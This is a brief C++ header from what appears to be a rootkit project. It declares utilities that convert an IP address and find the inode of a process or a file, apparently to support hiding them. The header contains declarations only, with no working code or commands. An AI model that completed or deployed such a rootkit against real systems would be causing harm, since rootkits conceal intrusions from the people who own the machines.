#ifndef ROOTKIT_UTILS_H
#define ROOTKIT_UTILS_H

#include <asm-generic/int-ll64.h>
#include <optional>
#include <string>
#include <arpa/inet.h>
#include <cstdint>

namespace rootkit::utils {
    std::optional<__u32> convert_ip(const std::string& ip);
    std::optional<uint64_t> get_inode_of_process(const pid_t pid);
    std::optional<uint64_t> get_inode_of_file(const std::string& file_path);
}

#endif
